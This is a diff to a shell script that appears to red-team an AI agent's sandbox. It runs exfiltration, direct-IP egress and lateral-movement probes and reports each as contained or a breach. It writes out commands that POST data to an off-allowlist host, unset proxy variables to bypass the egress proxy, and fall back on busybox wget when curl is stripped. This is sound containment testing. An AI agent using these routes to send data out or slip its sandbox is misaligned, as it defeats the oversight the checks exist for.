@@ -55,11 +55,21 @@ detect_runtime() {
 }
 ctr_running() { $RUNTIME inspect -f '{{.State.Running}}' "$1" 2>/dev/null | grep -qx true; }
 xa() { $RUNTIME exec "$AGENT" "$@"; }
+# The hardened agent image strips the curl/wget symlinks but keeps busybox, whose
+# built-in wget applet still works — detect it (mirrors tests/boundary-selftest.sh),
+# else the network attacks R3/R4/R5 silently SKIP on the very image they target.
 agent_tool() {
   if xa sh -c 'command -v curl' >/dev/null 2>&1; then echo curl
   elif xa sh -c 'command -v wget' >/dev/null 2>&1; then echo wget
+  elif xa sh -c 'command -v busybox >/dev/null 2>&1 && busybox 2>&1 | grep -qw wget'; then echo busybox-wget
   else echo none; fi
 }
+# Map the detected tool to the wget command (busybox needs the `busybox` prefix).
+agent_wget_cmd() { [ "$1" = busybox-wget ] && echo "busybox wget" || echo "wget"; }
+# busybox/GNU wget read the *lowercase* http_proxy; the agent sets only uppercase
+# HTTP_PROXY (compose), so proxied attempts must bridge it or they bypass the proxy
+# and produce a false BREACH. Pull the agent's own configured proxy value.
+agent_proxy() { xa sh -c 'printf %s "${HTTP_PROXY:-${http_proxy:-}}"' 2>/dev/null; }
 
 # R1 — Host filesystem write. The agent runs read_only:true; a write outside the
 # declared tmpfs mounts must fail. Try to create a file at the container root.
@@ -83,13 +93,14 @@ attack_cred_theft() {
 # R3 — Off-allowlist exfil. POST data to a host that is NOT on the allowlist;
 # the proxy must answer 403 before any upstream connect.
 attack_exfil() {
-  local tool code
+  local tool code wget pxy
   tool="$(agent_tool)"
   if [ "$tool" = none ]; then noted "R3-exfil" "no http tool in agent"; return; fi
+  wget="$(agent_wget_cmd "$tool")"; pxy="$(agent_proxy)"
   if [ "$tool" = curl ]; then
-    code="$(xa sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 -X POST --data 'secret=x' http://$OFFLIST_HOST/ 2>/dev/null")"
+    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' curl -s -o /dev/null -w '%{http_code}' --max-time 8 -X POST --data 'secret=x' http://$OFFLIST_HOST/ 2>/dev/null")"
   else
-    code="$(xa sh -c "wget -T 8 -S -q -O /dev/null --post-data 'secret=x' http://$OFFLIST_HOST/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
+    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' $wget -T 8 -S -q -O /dev/null --post-data 'secret=x' http://$OFFLIST_HOST/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
   fi
   if [ "$code" = 403 ]; then contained "R3-exfil" "$OFFLIST_HOST POST → 403"
   else breach "R3-exfil" "$OFFLIST_HOST POST → '${code:-no-response}' (not blocked)"; fi
@@ -98,15 +109,16 @@ attack_exfil() {
 # R4 — Direct-IP egress. (a) IP-literal through the proxy must be rejected (403);
 # (b) a proxy-bypassed raw connection must have no route.
 attack_direct_ip() {
-  local tool code raw
+  local tool code raw wget pxy
   tool="$(agent_tool)"
   if [ "$tool" = none ]; then noted "R4-direct-ip" "no http tool in agent"; return; fi
+  wget="$(agent_wget_cmd "$tool")"; pxy="$(agent_proxy)"
   if [ "$tool" = curl ]; then
-    code="$(xa sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 6 http://$PROBE_IP/ 2>/dev/null")"
+    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' curl -s -o /dev/null -w '%{http_code}' --max-time 6 http://$PROBE_IP/ 2>/dev/null")"
     raw="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy curl -s --max-time 6 -o /dev/null -w '%{http_code}' http://$PROBE_IP/ 2>&1; echo \" e=\$?\"")"
   else
-    code="$(xa sh -c "wget -T 6 -S -q -O /dev/null http://$PROBE_IP/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
-    raw="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy wget -T 6 -q -O /dev/null http://$PROBE_IP/ 2>&1; echo \"e=\$?\"")"
+    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' $wget -T 6 -S -q -O /dev/null http://$PROBE_IP/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
+    raw="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy $wget -T 6 -q -O /dev/null http://$PROBE_IP/ 2>&1; echo \"e=\$?\"")"
   fi
   if [ "$code" = 403 ]; then contained "R4-ip-proxy" "IP-literal via proxy → 403"
   else breach "R4-ip-proxy" "IP-literal via proxy → '${code:-no-response}'"; fi
@@ -117,14 +129,15 @@ attack_direct_ip() {
 # R5 — Lateral movement. The agent is on an internal-only net bridged only by the
 # proxy; it must not reach another workload or the egress container directly.
 attack_lateral() {
-  local tool out
+  local tool out wget
   tool="$(agent_tool)"
   if [ "$tool" = none ]; then noted "R5-lateral" "no http tool in agent"; return; fi
+  wget="$(agent_wget_cmd "$tool")"
   # Try the egress tinyproxy port directly (bypassing the proxy env).
   if [ "$tool" = curl ]; then
-    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY curl -s --max-time 6 -o /dev/null -w '%{http_code}' http://$EGRESS:8888/ 2>&1; echo \" e=\$?\"")"
+    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy curl -s --max-time 6 -o /dev/null -w '%{http_code}' http://$EGRESS:8888/ 2>&1; echo \" e=\$?\"")"
   else
-    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY wget -T 6 -q -O /dev/null http://$EGRESS:8888/ 2>&1; echo \"e=\$?\"")"
+    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy $wget -T 6 -q -O /dev/null http://$EGRESS:8888/ 2>&1; echo \"e=\$?\"")"
   fi
   if echo "$out" | grep -qE 'e=0|^200|^403| 200 '; then
     breach "R5-lateral" "agent reached $EGRESS:8888 directly [$out]"
